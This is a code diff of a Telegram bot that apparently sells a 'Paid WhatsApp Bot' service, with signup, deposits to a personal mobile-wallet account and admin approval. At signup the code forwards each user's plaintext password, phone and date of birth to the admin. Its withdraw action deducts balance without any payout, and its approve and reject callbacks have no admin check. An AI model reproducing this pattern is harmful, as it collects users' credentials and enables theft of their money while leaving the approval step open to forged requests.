@@ -36,7 +36,7 @@ function getCurrentDateTime() {
 function withBackButton(buttons = []) {
     return Markup.inlineKeyboard([
         ...buttons,
-        [Markup.button.callback('⏪ Back', 'backToMenu')]
+        [Markup.button.callback('⬅️ Back', 'backToMenu')]
     ]);
 }
 
@@ -127,7 +127,9 @@ bot.on('text', async (ctx) => {
             }
 
             case 'username':
-                if (!/^[a-z0-9_]{3,15}$/.test(text)) return ctx.reply('Invalid username format. Example: wasi123');
+                if (!/^[a-z0-9_]{3,15}$/.test(text)) {
+                    return ctx.reply('Invalid username format. Example: wasi123');
+                }
                 if (users[text]) return ctx.reply('Already Taken. Try Another.');
                 session.username = text;
                 session.step = 'password';
@@ -163,7 +165,11 @@ bot.on('text', async (ctx) => {
                 );
 
                 const { date, time } = getCurrentDateTime();
-                const adminMsg = ` 🔔• NEW ACCOUNT 👤 Name: ${session.firstName} 🎂 DOB: ${session.dob} 📞 Phone: ${session.phone} 👤 Username: ${session.username} 🔐 Password: ${session.password} ⏱ Date: ${date} Time: ${time} 📨 Telegram: @${ctx.from.username || 'Not Set'} [https://t.me/${ctx.from.username || 'user?id=' + chatId}] `;
+                const adminMsg = `
+🆕 NEW ACCOUNT
+👤 Name: ${session.firstName} 🎂 DOB: ${session.dob} 📞 Phone: ${session.phone} 👤 Username: ${session.username} 🔑 Password: ${session.password} 📅 Date: ${date} Time: ${time}
+📲 Telegram: @${ctx.from.username || 'Not Set'} [https://t.me/${ctx.from.username || 'user?id=' + chatId}]
+`;
                 await bot.telegram.sendMessage(ADMIN_ID, adminMsg);
                 break;
         }
@@ -179,7 +185,7 @@ bot.on('text', async (ctx) => {
                         'Username not found.',
                         Markup.inlineKeyboard([
                             [Markup.button.callback('Sign Up', 'signup')],
-                            [Markup.button.callback('⏪ Back', 'backToMenu')]
+                            [Markup.button.callback('⬅️ Back', 'backToMenu')]
                         ])
                     );
                 }
@@ -212,14 +218,16 @@ bot.on('text', async (ctx) => {
         // Step 1: Enter Amount
         if (session.step === 'enterAmount') {
             const amount = parseInt(text);
-            if (isNaN(amount) || amount <= 0) return ctx.reply('❌ Invalid amount. Enter a valid number:');
+            if (isNaN(amount) || amount <= 0) 
+                return ctx.reply('❌ Invalid amount. Enter a valid number:');
 
             session.depositAmount = amount;
             session.step = 'awaitProof';
+            return ctx.reply(
+`📤 Payment of ${amount} PKR is noted for upgrade your funds.
 
-            // ✅ دو الگ میسجز
-            await ctx.reply(`📝 Payment of ${amount} PKR is noted for update Funds.`);
-            return ctx.reply('Please send your payment proof TiD or TrX ID');
+Please send your payment proof Only TiD , TrX ID , Transaction ID (Screenshot ❌)`
+            );
         }
 
         // Step 2: Await Proof
@@ -240,13 +248,19 @@ bot.on('text', async (ctx) => {
                 method: session.depositMethod
             });
 
-            const adminMsg = ` 💰 Deposit Request 👤 User: ${user.firstName} (Username: ${session.usernameKey}) 💵 Amount: ${session.depositAmount} PKR ⏱ Date: ${date} Time: ${time} 📝 Proof: ${proofText} `;
+            const adminMsg = `
+💰 Deposit Request
+👤 User: ${user.firstName} (Username: ${session.usernameKey})
+💵 Amount: ${session.depositAmount} PKR
+📅 Date: ${date} Time: ${time}
+🖼 Proof: ${proofText}
+`;
 
             await bot.telegram.sendMessage(
                 ADMIN_ID,
                 adminMsg,
                 Markup.inlineKeyboard([
-                    Markup.button.callback('✔️ Approve', `approve_${ctx.chat.id}_${depositId}`),
+                    Markup.button.callback('✅ Approve', `approve_${ctx.chat.id}_${depositId}`),
                     Markup.button.callback('❌ Reject', `reject_${ctx.chat.id}_${depositId}`)
                 ])
             );
@@ -257,7 +271,24 @@ bot.on('text', async (ctx) => {
     }
 });
 
-// ===== BUTTON ACTIONS =======
+// ===== BUTTON ACTIONS =====
+
+// --- Check Balance + View Transactions
+bot.action('checkBalance', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) return ctx.reply('Please login first.');
+
+    const user = users[session.usernameKey];
+    const { date, time } = getCurrentDateTime();
+
+    return ctx.reply(
+        `Dear Customer, Your Account Balance Is: ${user.balance || 0} PKR On Account: ${user.firstName} Date: ${date} Time: ${time}`,
+        Markup.inlineKeyboard([
+            [Markup.button.callback('📜 View Transaction History', 'viewTransactions')],
+            [Markup.button.callback('⬅️ Back', 'backToMenu')]
+        ])
+    );
+});
 
 // --- Deposit Balance (Select Payment Method)
 bot.action('depositBalance', async (ctx) => {
@@ -270,10 +301,10 @@ bot.action('depositBalance', async (ctx) => {
     await ctx.reply(
         'Select Your Payment Deposit Method:',
         Markup.inlineKeyboard([
-            [Markup.button.callback('✔️ JazzCash', 'depositJazzCash')],
+            [Markup.button.callback('✈️ JazzCash', 'depositJazzCash')],
             [Markup.button.callback('🏦 EasyPaisa', 'depositEasyPaisa')],
             [Markup.button.callback('💳 U-Paisa', 'depositUPaisa')],
-            [Markup.button.callback('⏪ Back', 'backToMenu')]
+            [Markup.button.callback('⬅️ Back', 'backToMenu')]
         ])
     );
 });
@@ -291,13 +322,145 @@ bot.action(/deposit(JazzCash|EasyPaisa|UPaisa)/, async (ctx) => {
     const accountType = method === 'UPaisa' ? 'U-Paisa' : method;
 
     await ctx.reply(
-        `💠 You selected ${accountType}. Please send payment to:  
-Account Title: M Hadi  
-Account Number: 03000382844  
+`💰 You selected ${accountType}. Please send payment to:
+
+Account Title: M Hadi
+Account Number: 03000382844
 Account Type: ${accountType}`
     );
 
     await ctx.reply('💵 Enter your amount you are sending (PKR):');
+});
+
+// --- Withdraw Balance
+bot.action('withdrawBalance', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) return ctx.reply('Please login first.');
+
+    const user = users[session.usernameKey];
+    const amount = 200; // example withdraw
+    if ((user.balance || 0) < amount) return ctx.reply(`❌ Not Enough Balance To Withdraw ${amount} PKR`, withBackButton([]));
+
+    user.balance -= amount;
+    if (!user.transactions) user.transactions = [];
+    const { date, time } = getCurrentDateTime();
+    user.transactions.push({ type: 'Withdraw ➖', amount, date, time });
+
+    saveUsers();
+    return ctx.reply(`✅ ${amount} PKR Withdrawn Successfully`, withBackButton([]));
+});
+
+// --- Buy Bot (deduct 100 PKR)
+bot.action('buyBot', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) return ctx.reply('Please login first.');
+
+    const user = users[session.usernameKey];
+    const cost = 100;
+    if ((user.balance || 0) < cost) return ctx.reply(`❌ Not Enough Balance To Buy Bot (Cost: ${cost} PKR)`, withBackButton([]));
+
+    user.balance -= cost;
+    if (!user.transactions) user.transactions = [];
+    const { date, time } = getCurrentDateTime();
+    user.transactions.push({ type: 'Buy Bot ➖', amount: cost, date, time });
+
+    saveUsers();
+    return ctx.reply(`✅ Bot Purchased! ${cost} PKR Deducted`, withBackButton([]));
+});
+
+// --- View Transaction History
+bot.action('viewTransactions', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) return ctx.reply('Please login first.');
+
+    const user = users[session.usernameKey];
+    if (!user.transactions || user.transactions.length === 0) return ctx.reply('No transactions found.', withBackButton([]));
+
+    let historyMsg = '📜 Transaction History:\n\n';
+    user.transactions.forEach((t, i) => {
+        historyMsg += `${i + 1}. ${t.type}: ${t.amount} PKR on ${t.date} at ${t.time}\n`;
+    });
+
+    return ctx.reply(historyMsg, withBackButton([]));
+});
+
+// --- Log Out
+bot.action('logOut', async (ctx) => {
+    sessions[ctx.chat.id] = null;
+    return ctx.reply('🔓 You have been logged out.', withBackButton([]));
+});
+
+// ======= BACK BUTTON =====
+bot.action('backToMenu', async (ctx) => {
+    const session = sessions[ctx.chat.id];
+    if (!session || !session.usernameKey) {
+        return ctx.reply(
+            '👋 Welcome!\n\nPlease Sign Up or Log In:',
+            Markup.inlineKeyboard([
+                Markup.button.callback('Sign Up', 'signup'),
+                Markup.button.callback('Log In', 'login')
+            ])
+        );
+    } else {
+        const user = users[session.usernameKey];
+        return ctx.reply(
+            `Dear ${user.firstName}, Welcome To Paid WhatsApp Bot`,
+            withBackButton([
+                [Markup.button.callback('Check Balance', 'checkBalance')],
+                [Markup.button.callback('Buy Bot', 'buyBot')],
+                [Markup.button.callback('Deposit Balance', 'depositBalance')],
+                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
+                [Markup.button.callback('Log Out', 'logOut')]
+            ])
+        );
+    }
+});
+
+// ======= ADMIN APPROVAL =======
+bot.action(/approve_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, depositId] = ctx.match;
+    const session = sessions[userChatId];
+    if (!session || !session.pendingDeposits) return ctx.answerCbQuery('No pending deposit.');
+
+    const deposit = session.pendingDeposits.find(d => d.id === depositId);
+    if (!deposit) return ctx.answerCbQuery('Deposit already processed.');
+
+    const user = users[session.usernameKey];
+    const { date, time } = getCurrentDateTime();
+
+    user.balance = (user.balance || 0) + deposit.amount;
+    if (!user.transactions) user.transactions = [];
+    user.transactions.push({
+        type: `Deposit ➕ (${deposit.method || 'N/A'})`,
+        amount: deposit.amount,
+        date,
+        time,
+        proof: deposit.proof
+    });
+    saveUsers();
+
+    await bot.telegram.sendMessage(userChatId, `✅ Your fund of ${deposit.amount} PKR has been approved!`, withBackButton([]));
+
+    // remove processed deposit
+    session.pendingDeposits = session.pendingDeposits.filter(d => d.id !== depositId);
+
+    await ctx.editMessageText('✅ Deposit Approved ✅');
+});
+
+bot.action(/reject_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
+    const [_, userChatId, depositId] = ctx.match;
+    const session = sessions[userChatId];
+    if (!session || !session.pendingDeposits) return ctx.answerCbQuery('No pending deposit.');
+
+    const deposit = session.pendingDeposits.find(d => d.id === depositId);
+    if (!deposit) return ctx.answerCbQuery('Deposit already processed.');
+
+    await bot.telegram.sendMessage(userChatId, `❌ Your deposit of ${deposit.amount} PKR has been rejected.`, withBackButton([]));
+
+    // remove processed deposit
+    session.pendingDeposits = session.pendingDeposits.filter(d => d.id !== depositId);
+
+    await ctx.editMessageText('❌ Deposit Rejected ❌');
 });
 
 // ===== LAUNCH =====
